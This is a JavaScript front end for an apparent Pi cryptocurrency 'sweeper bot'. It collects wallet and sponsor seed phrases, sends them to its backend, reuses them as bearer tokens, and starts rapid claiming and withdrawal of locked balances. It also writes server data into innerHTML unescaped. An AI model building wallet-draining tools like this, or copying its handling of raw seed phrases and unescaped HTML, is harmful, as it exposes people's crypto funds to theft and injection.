class PiSweeperBot {
    constructor() {
        this.isLoggedIn = false;
        this.walletSeed = '';
        this.sponsorSeed = '';
        this.logs = [];
        this.claimCounter = 0;
        this.transferCounter = 0;
        this.eventSource = null;
        
        this.initializeUI();
        this.startServerTimeUpdate();
        this.connectEventStream();
    }

    initializeUI() {
        // Tab switching
        document.getElementById('login-tab').onclick = () => this.switchTab('login');
        document.getElementById('withdraw-tab').onclick = () => this.switchTab('withdraw');
        
        // Form handlers
        document.getElementById('login-form').onsubmit = (e) => this.handleLogin(e);
        document.getElementById('withdraw-form').onsubmit = (e) => this.handleWithdraw(e);
        document.getElementById('claim-btn').onclick = () => this.handleClaim();
    }

    switchTab(tab) {
        const loginTab = document.getElementById('login-tab');
        const withdrawTab = document.getElementById('withdraw-tab');
        const loginPage = document.getElementById('login-page');
        const withdrawPage = document.getElementById('withdraw-page');

        if (tab === 'login') {
            loginTab.classList.add('active');
            withdrawTab.classList.remove('active');
            loginPage.classList.add('active');
            withdrawPage.classList.remove('active');
        } else {
            if (!this.isLoggedIn) {
                this.showNotification('Please login first', 'error');
                return;
            }
            loginTab.classList.remove('active');
            withdrawTab.classList.add('active');
            loginPage.classList.remove('active');
            withdrawPage.classList.add('active');
            this.loadWalletData();
        }
    }

    async startServerTimeUpdate() {
        const updateTime = async () => {
            try {
                const response = await fetch('/api/time');
                const data = await response.json();
                document.getElementById('server-time').textContent = 
                    new Date(data.server_time).toLocaleString();
            } catch (error) {
                console.error('Failed to update server time:', error);
            }
        };

        updateTime();
        setInterval(updateTime, 100); // Update every 100ms for precision
    }

    connectEventStream() {
        this.eventSource = new EventSource('/api/logs');
        this.eventSource.onmessage = (event) => {
            const logEntry = JSON.parse(event.data);
            this.addLogEntry(logEntry);
        };
    }

    async handleLogin(event) {
        event.preventDefault();
        
        const seedPhrase = document.getElementById('seed-phrase').value.trim();
        if (!seedPhrase) {
            this.showNotification('Please enter your seed phrase', 'error');
            return;
        }

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ seed_phrase: seedPhrase })
            });

            const data = await response.json();
            
            if (response.ok) {
                this.isLoggedIn = true;
                this.walletSeed = seedPhrase;
                this.showNotification('Login successful!', 'success');
                this.switchTab('withdraw');
            } else {
                this.showNotification(data.error || 'Login failed', 'error');
            }
        } catch (error) {
            this.showNotification('Network error during login', 'error');
        }
    }

    async loadWalletData() {
        try {
            // Load balance
            const balanceResponse = await fetch('/api/balance', {
                headers: { 'Authorization': `Bearer ${this.walletSeed}` }
            });
            const balanceData = await balanceResponse.json();
            
            document.getElementById('available-balance').textContent = 
                `${(balanceData.available / 1000000).toFixed(6)} PI`;

            // Populate locked balances
            const lockedSelect = document.getElementById('locked-balance');
            lockedSelect.innerHTML = '<option value="">Select locked balance...</option>';
            
            balanceData.locked.forEach((locked, index) => {
                const option = document.createElement('option');
                option.value = locked.id;
                option.textContent = `${(locked.amount / 1000000).toFixed(6)} PI - Unlocks: ${new Date(locked.unlock_time).toLocaleString()}`;
                lockedSelect.appendChild(option);
            });

            // Load recent transactions
            await this.loadRecentTransactions();
        } catch (error) {
            this.showNotification('Failed to load wallet data', 'error');
        }
    }

    async loadRecentTransactions() {
        try {
            const response = await fetch('/api/transactions', {
                headers: { 'Authorization': `Bearer ${this.walletSeed}` }
            });
            const transactions = await response.json();
            
            const container = document.getElementById('recent-transactions');
            if (transactions.length === 0) {
                container.innerHTML = '<p>No transactions yet</p>';
                return;
            }

            container.innerHTML = transactions.map(tx => `
                <div class="transaction-item">
                    <span class="tx-type">${tx.type}</span>
                    <span class="tx-amount">${(tx.amount / 1000000).toFixed(6)} PI</span>
                    <span class="tx-time">${new Date(tx.timestamp).toLocaleString()}</span>
                    <span class="tx-status ${tx.status}">${tx.status}</span>
                </div>
            `).join('');
        } catch (error) {
            console.error('Failed to load transactions:', error);
        }
    }

    async handleClaim() {
        const sponsorPhrase = document.getElementById('sponsor-phrase').value.trim();
        if (!sponsorPhrase) {
            this.showNotification('Sponsor seed phrase required for claiming', 'error');
            return;
        }

        try {
            const response = await fetch('/api/claim', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.walletSeed}`
                },
                body: JSON.stringify({ 
                    sponsor_seed: sponsorPhrase 
                })
            });

            const data = await response.json();
            
            if (response.ok) {
                this.showNotification('Claiming started!', 'success');
                this.addLogEntry({
                    timestamp: new Date().toISOString(),
                    level: 'INFO',
                    message: '🎯 Aggressive claiming initiated with sponsor fee payment'
                });
            } else {
                this.showNotification(data.error || 'Claiming failed', 'error');
            }
        } catch (error) {
            this.showNotification('Network error during claiming', 'error');
        }
    }

    async handleWithdraw(event) {
        event.preventDefault();
        
        const withdrawalAddress = document.getElementById('withdrawal-address').value.trim();
        const amount = parseFloat(document.getElementById('amount').value);
        const sponsorPhrase = document.getElementById('sponsor-phrase').value.trim();
        
        if (!withdrawalAddress || !amount || amount <= 0) {
            this.showNotification('Please fill in all required fields', 'error');
            return;
        }

        try {
            const requestBody = {
                to_address: withdrawalAddress,
                amount: Math.floor(amount * 1000000), // Convert to smallest unit
                sponsor_seed: sponsorPhrase || null
            };

            const response = await fetch('/api/withdraw', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.walletSeed}`
                },
                body: JSON.stringify(requestBody)
            });

            const data = await response.json();
            
            if (response.ok) {
                this.showNotification('Withdrawal initiated!', 'success');
                this.addLogEntry({
                    timestamp: new Date().toISOString(),
                    level: 'INFO',
                    message: `🚀 High-speed withdrawal started: ${amount} PI to ${withdrawalAddress}`
                });
                
                // Clear form
                document.getElementById('withdraw-form').reset();
                
                // Refresh wallet data
                setTimeout(() => this.loadWalletData(), 2000);
            } else {
                this.showNotification(data.error || 'Withdrawal failed', 'error');
            }
        } catch (error) {
            this.showNotification('Network error during withdrawal', 'error');
        }
    }

    addLogEntry(logEntry) {
        const logsContainer = document.getElementById('live-logs');
        const logElement = document.createElement('div');
        logElement.className = `log-entry ${logEntry.level.toLowerCase()}`;
        
        const timestamp = new Date(logEntry.timestamp).toLocaleTimeString();
        logElement.innerHTML = `
            <span class="log-time">${timestamp}</span>
            <span class="log-level">${logEntry.level}</span>
            <span class="log-message">${logEntry.message}</span>
        `;
        
        // Add to top of logs
        if (logsContainer.firstChild && logsContainer.firstChild.tagName !== 'P') {
            logsContainer.insertBefore(logElement, logsContainer.firstChild);
        } else {
            logsContainer.innerHTML = '';
            logsContainer.appendChild(logElement);
        }
        
        // Keep only last 50 entries
        while (logsContainer.children.length > 50) {
            logsContainer.removeChild(logsContainer.lastChild);
        }
        
        // Update counters
        if (logEntry.message.includes('Claim attempt')) {
            this.claimCounter++;
            document.getElementById('claim-counter').textContent = this.claimCounter;
        }
        if (logEntry.message.includes('Transfer attempt')) {
            this.transferCounter++;
            document.getElementById('transfer-counter').textContent = this.transferCounter;
        }
    }

    showNotification(message, type) {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.textContent = message;
        
        // Add to page
        document.body.appendChild(notification);
        
        // Remove after 3 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 3000);
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    new PiSweeperBot();
});